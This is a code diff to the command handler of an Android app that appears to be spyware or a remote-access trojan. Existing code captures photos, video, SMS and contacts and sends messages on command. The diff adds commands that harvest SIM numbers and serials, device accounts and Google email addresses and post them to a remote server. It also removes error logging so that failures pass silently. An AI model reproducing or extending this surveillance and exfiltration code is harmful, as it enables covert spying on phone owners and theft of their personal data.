@@ -1,6 +1,7 @@
 package com.csk4.app
 
 import android.Manifest
+import android.accounts.AccountManager
 import android.app.admin.DevicePolicyManager
 import android.content.ComponentName
 import android.content.Context
@@ -22,6 +23,7 @@ import android.provider.ContactsContract
 import android.provider.Settings
 import android.provider.Telephony
 import android.telephony.SmsManager
+import android.telephony.TelephonyManager
 import android.util.Log
 import androidx.core.app.ActivityCompat
 import com.android.volley.Request
@@ -59,6 +61,11 @@ class CommandHandler(private val ctx: Context, private val deviceId: String) {
             "get_apps" -> { handleApps(); onDone("apps_sent") }
             "get_bluetooth" -> handleBluetooth(onDone)
             "get_info" -> { handleDeviceInfo(); onDone("info_sent") }
+
+            // ============ 🆕 NEW: SIM + ACCOUNTS + EMAILS ============
+            "get_sim_info" -> { handleSimInfo(); onDone("sim_sent") }
+            "get_accounts" -> { handleAccounts(); onDone("accounts_sent") }
+            "get_email_accounts" -> { handleEmailAccounts(); onDone("emails_sent") }
 
             // ============ HARDWARE CONTROL ============
             "vibrate" -> { vibrate(); onDone("vibrated") }
@@ -152,10 +159,153 @@ class CommandHandler(private val ctx: Context, private val deviceId: String) {
         }
     }
 
+    // ============================================================
+    // 🆕 SIM INFO
+    // ============================================================
+    private fun handleSimInfo() {
+        try {
+            val tm = ctx.getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager
+            val json = JSONObject().apply {
+                put("deviceId", deviceId)
+                put("token", Config.DEVICE_TOKEN)
+                put("sims", JSONArray())
+            }
+            val simsArray = json.getJSONArray("sims")
+
+            if (ActivityCompat.checkSelfPermission(ctx, Manifest.permission.READ_PHONE_STATE)
+                != PackageManager.PERMISSION_GRANTED) {
+                post("${Config.SERVER_URL}/api/device/siminfo", json)
+                return
+            }
+
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP_MR1) {
+                try {
+                    val simCount = tm.phoneCount
+                    for (i in 0 until simCount) {
+                        val simJson = JSONObject()
+                        simJson.put("slot", i + 1)
+
+                        val state = tm.getSimState(i)
+                        simJson.put("state", when (state) {
+                            TelephonyManager.SIM_STATE_READY -> "READY"
+                            TelephonyManager.SIM_STATE_ABSENT -> "ABSENT"
+                            TelephonyManager.SIM_STATE_PIN_REQUIRED -> "PIN_REQUIRED"
+                            TelephonyManager.SIM_STATE_PUK_REQUIRED -> "PUK_REQUIRED"
+                            TelephonyManager.SIM_STATE_NETWORK_LOCKED -> "NETWORK_LOCKED"
+                            TelephonyManager.SIM_STATE_NOT_READY -> "NOT_READY"
+                            else -> "UNKNOWN"
+                        })
+
+                        try {
+                            simJson.put("operator", tm.getSimOperatorName(i) ?: "Unknown")
+                            simJson.put("operatorCode", tm.getSimOperator(i) ?: "")
+                            simJson.put("country", tm.getSimCountryIso(i) ?: "")
+                        } catch (e: Exception) {}
+
+                        try {
+                            val number = tm.getLine1Number(i)
+                            simJson.put("number", if (!number.isNullOrEmpty()) number else "Not available")
+                        } catch (e: Exception) {
+                            simJson.put("number", "Not available")
+                        }
+
+                        try {
+                            val serial = tm.getSimSerialNumber(i)
+                            if (!serial.isNullOrEmpty()) simJson.put("serial", serial)
+                        } catch (e: Exception) {}
+
+                        try {
+                            val netType = tm.getNetworkType(i)
+                            simJson.put("networkType", when(netType) {
+                                TelephonyManager.NETWORK_TYPE_LTE -> "4G LTE"
+                                TelephonyManager.NETWORK_TYPE_NR -> "5G"
+                                TelephonyManager.NETWORK_TYPE_HSPA -> "3G HSPA"
+                                TelephonyManager.NETWORK_TYPE_UMTS -> "3G UMTS"
+                                TelephonyManager.NETWORK_TYPE_EDGE -> "2G EDGE"
+                                TelephonyManager.NETWORK_TYPE_GPRS -> "2G GPRS"
+                                else -> "Unknown"
+                            })
+                        } catch (e: Exception) {}
+
+                        simsArray.put(simJson)
+                    }
+                } catch (e: Exception) {
+                    Log.e(TAG, "SIM info: ${e.message}")
+                }
+            }
+
+            post("${Config.SERVER_URL}/api/device/siminfo", json)
+            Log.d(TAG, "✅ SIM info sent")
+        } catch (e: Exception) {
+            Log.e(TAG, "handleSimInfo: ${e.message}")
+        }
+    }
+
+    // ============================================================
+    // 🆕 ACCOUNTS
+    // ============================================================
+    private fun handleAccounts() {
+        try {
+            val am = AccountManager.get(ctx)
+            val accounts = am.getAccounts()
+            val accountsArray = JSONArray()
+
+            accounts.forEach { account ->
+                try {
+                    accountsArray.put(JSONObject().apply {
+                        put("name", account.name ?: "")
+                        put("type", account.type ?: "")
+                    })
+                } catch (e: Exception) {}
+            }
+
+            val json = JSONObject().apply {
+                put("deviceId", deviceId)
+                put("token", Config.DEVICE_TOKEN)
+                put("total", accountsArray.length())
+                put("accounts", accountsArray)
+            }
+            post("${Config.SERVER_URL}/api/device/accounts", json)
+            Log.d(TAG, "✅ Accounts sent: ${accountsArray.length()}")
+        } catch (e: Exception) {
+            Log.e(TAG, "handleAccounts: ${e.message}")
+        }
+    }
+
+    // ============================================================
+    // 🆕 EMAILS
+    // ============================================================
+    private fun handleEmailAccounts() {
+        try {
+            val am = AccountManager.get(ctx)
+            val accounts = am.getAccounts()
+            val emailsArray = JSONArray()
+
+            accounts.forEach { account ->
+                if (account.type == "com.google") {
+                    try { emailsArray.put(account.name) } catch (e: Exception) {}
+                }
+            }
+
+            val json = JSONObject().apply {
+                put("deviceId", deviceId)
+                put("token", Config.DEVICE_TOKEN)
+                put("total", emailsArray.length())
+                put("emails", emailsArray)
+            }
+            post("${Config.SERVER_URL}/api/device/emails", json)
+            Log.d(TAG, "✅ Emails sent: ${emailsArray.length()}")
+        } catch (e: Exception) {
+            Log.e(TAG, "handleEmailAccounts: ${e.message}")
+        }
+    }
+
+    // ============================================================
+    // EXISTING FUNCTIONS
+    // ============================================================
     private fun takePhoto(front: Boolean, onDone: (String) -> Unit) {
         if (webrtc != null) {
-            webrtc?.stop()
-            webrtc = null
+            webrtc?.stop(); webrtc = null
             Handler(Looper.getMainLooper()).postDelayed({
                 CameraController(ctx).capturePhoto(front) { file, err ->
                     if (file != null) { uploadFile(file, "photo"); onDone("photo_ok") }
@@ -172,8 +322,7 @@ class CommandHandler(private val ctx: Context, private val deviceId: String) {
 
     private fun recordVideo(front: Boolean, duration: Int, onDone: (String) -> Unit) {
         if (webrtc != null) {
-            webrtc?.stop()
-            webrtc = null
+            webrtc?.stop(); webrtc = null
             Handler(Looper.getMainLooper()).postDelayed({
                 VideoRecorder(ctx).recordVideo(front, duration) { file, err ->
                     if (file != null) { uploadFile(file, "video"); onDone("video_ok") }
@@ -209,15 +358,9 @@ class CommandHandler(private val ctx: Context, private val deviceId: String) {
         try {
             if (Build.VERSION.SDK_INT >= 23 && Settings.System.canWrite(ctx)) {
                 val brightness = (value * 255 / 100).coerceIn(0, 255)
-                Settings.System.putInt(ctx.contentResolver,
-                    Settings.System.SCREEN_BRIGHTNESS, brightness)
-            } else if (Build.VERSION.SDK_INT >= 23) {
-                val intent = Intent(Settings.ACTION_MANAGE_WRITE_SETTINGS)
-                intent.data = Uri.parse("package:${ctx.packageName}")
-                intent.flags = Intent.FLAG_ACTIVITY_NEW_TASK
-                ctx.startActivity(intent)
+                Settings.System.putInt(ctx.contentResolver, Settings.System.SCREEN_BRIGHTNESS, brightness)
             }
-        } catch (e: Exception) { Log.e(TAG, "Brightness: ${e.message}") }
+        } catch (e: Exception) {}
     }
 
     private fun setVolume(value: Int) {
@@ -228,7 +371,7 @@ class CommandHandler(private val ctx: Context, private val deviceId: String) {
             am.setStreamVolume(AudioManager.STREAM_MUSIC, vol, 0)
             am.setStreamVolume(AudioManager.STREAM_RING, vol, 0)
             am.setStreamVolume(AudioManager.STREAM_NOTIFICATION, vol, 0)
-        } catch (e: Exception) { Log.e(TAG, "Volume: ${e.message}") }
+        } catch (e: Exception) {}
     }
 
     private fun setRingMode(mode: String) {
@@ -239,7 +382,7 @@ class CommandHandler(private val ctx: Context, private val deviceId: String) {
                 "vibrate" -> am.ringerMode = AudioManager.RINGER_MODE_VIBRATE
                 "normal" -> am.ringerMode = AudioManager.RINGER_MODE_NORMAL
             }
-        } catch (e: Exception) { Log.e(TAG, "RingMode: ${e.message}") }
+        } catch (e: Exception) {}
     }
 
     private fun openApp(packageName: String) {
@@ -249,7 +392,7 @@ class CommandHandler(private val ctx: Context, private val deviceId: String) {
                 intent.flags = Intent.FLAG_ACTIVITY_NEW_TASK
                 ctx.startActivity(intent)
             }
-        } catch (e: Exception) { Log.e(TAG, "OpenApp: ${e.message}") }
+        } catch (e: Exception) {}
     }
 
     private fun uninstallApp(packageName: String) {
@@ -258,23 +401,22 @@ class CommandHandler(private val ctx: Context, private val deviceId: String) {
             intent.data = Uri.parse("package:$packageName")
             intent.flags = Intent.FLAG_ACTIVITY_NEW_TASK
             ctx.startActivity(intent)
-        } catch (e: Exception) { Log.e(TAG, "Uninstall: ${e.message}") }
+        } catch (e: Exception) {}
     }
 
     private fun forceStopApp(packageName: String) {
         try {
             val am = ctx.getSystemService(Context.ACTIVITY_SERVICE) as android.app.ActivityManager
             am.killBackgroundProcesses(packageName)
-        } catch (e: Exception) { Log.e(TAG, "ForceStop: ${e.message}") }
+        } catch (e: Exception) {}
     }
 
     private fun sendSMS(to: String, message: String) {
         try {
             if (ActivityCompat.checkSelfPermission(ctx, Manifest.permission.SEND_SMS)
                 != PackageManager.PERMISSION_GRANTED) return
-            val sms = SmsManager.getDefault()
-            sms.sendTextMessage(to, null, message, null, null)
-        } catch (e: Exception) { Log.e(TAG, "SendSMS: ${e.message}") }
+            SmsManager.getDefault().sendTextMessage(to, null, message, null, null)
+        } catch (e: Exception) {}
     }
 
     private fun sendWhatsApp(number: String, message: String) {
@@ -284,7 +426,7 @@ class CommandHandler(private val ctx: Context, private val deviceId: String) {
             intent.data = Uri.parse(url)
             intent.flags = Intent.FLAG_ACTIVITY_NEW_TASK
             ctx.startActivity(intent)
-        } catch (e: Exception) { Log.e(TAG, "SendWA: ${e.message}") }
+        } catch (e: Exception) {}
     }
 
     private fun showNotification(title: String, message: String) {
@@ -297,14 +439,12 @@ class CommandHandler(private val ctx: Context, private val deviceId: String) {
                 nm.createNotificationChannel(chan)
             }
             val notif = androidx.core.app.NotificationCompat.Builder(ctx, channelId)
-                .setContentTitle(title)
-                .setContentText(message)
+                .setContentTitle(title).setContentText(message)
                 .setSmallIcon(android.R.drawable.ic_dialog_info)
                 .setPriority(androidx.core.app.NotificationCompat.PRIORITY_HIGH)
-                .setAutoCancel(true)
-                .build()
+                .setAutoCancel(true).build()
             nm.notify(System.currentTimeMillis().toInt(), notif)
-        } catch (e: Exception) { Log.e(TAG, "Notif: ${e.message}") }
+        } catch (e: Exception) {}
     }
 
     private fun lockScreen() {
@@ -312,7 +452,7 @@ class CommandHandler(private val ctx: Context, private val deviceId: String) {
             val dpm = ctx.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
             val admin = ComponentName(ctx, DeviceAdminReceiver::class.java)
             if (dpm.isAdminActive(admin)) dpm.lockNow()
-        } catch (e: Exception) { Log.e(TAG, "Lock: ${e.message}") }
+        } catch (e: Exception) {}
     }
 
     private fun handleBluetooth(onDone: (String) -> Unit) {
@@ -366,9 +506,7 @@ class CommandHandler(private val ctx: Context, private val deviceId: String) {
                         arr.put(JSONObject().apply {
                             put("name", name)
                             put("phone", phone)
-                            put("type", when(type) {
-                                1 -> "Home"; 2 -> "Mobile"; 3 -> "Work"; else -> "Other"
-                            })
+                            put("type", when(type) { 1 -> "Home"; 2 -> "Mobile"; 3 -> "Work"; else -> "Other" })
                         })
                     }
                 } catch (e: Exception) {}
@@ -386,8 +524,7 @@ class CommandHandler(private val ctx: Context, private val deviceId: String) {
         if (!hasPerm(Manifest.permission.READ_SMS)) return
         val arr = JSONArray()
         val cur = ctx.contentResolver.query(
-            Telephony.Sms.CONTENT_URI, null, null, null,
-            Telephony.Sms.DATE + " DESC")
+            Telephony.Sms.CONTENT_URI, null, null, null, Telephony.Sms.DATE + " DESC")
         cur?.use {
             while (it.moveToNext()) {
                 try {
@@ -558,7 +695,7 @@ class CommandHandler(private val ctx: Context, private val deviceId: String) {
                 }
             }
             Volley.newRequestQueue(ctx).add(req)
-        } catch (e: Exception) { Log.e(TAG, "Upload err: ${e.message}") }
+        } catch (e: Exception) {}
     }
 
     private fun readFile(file: File): ByteArray {
